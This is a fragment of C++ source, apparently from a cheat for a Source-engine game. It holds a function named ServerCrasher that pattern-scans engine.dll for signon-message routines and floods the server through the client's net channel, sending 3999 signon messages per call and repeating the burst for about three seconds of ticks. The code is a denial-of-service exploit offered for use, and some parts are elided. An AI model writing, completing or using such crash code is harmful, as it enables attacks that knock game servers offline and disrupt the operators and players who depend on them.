...
bool Utilities::crashsrv = false;

CClientState *g_ClientState2;
void Utilities::ServerCrasher()
{
	static int crashrepeat;

	static auto ConstructSignon = reinterpret_cast<void(__thiscall*)(void*, int, int)>(Utilities::Memory::pattern_scan(GetModuleHandle("engine.dll"), "55 8B EC 56 57 8B F9 8D 4F 04"));
	static auto DestructSignon = reinterpret_cast<void(__thiscall*)(void*)>(Utilities::Memory::pattern_scan(GetModuleHandle("engine.dll"), "53 56 57 8B F9 8D 77 38 C7 07"));
	...
	void* msg = malloc(76);
	ConstructSignon(msg, 6, g_ClientState2->m_nServerCount);

	for (int i = 0; i < 3999; ++i)
		call_vfunc<bool(__thiscall*)(void*, void*, bool, bool)>(g_ClientState2->m_NetChannel, 42)(g_ClientState2->m_NetChannel, msg, false, false);

	DestructSignon(msg);

	++crashrepeat;

	if (crashrepeat >= (int)(1 / Interfaces::Globals->interval_per_tick) * 3)
	{
		crashrepeat = 0;
		crashsrv = false;
	}
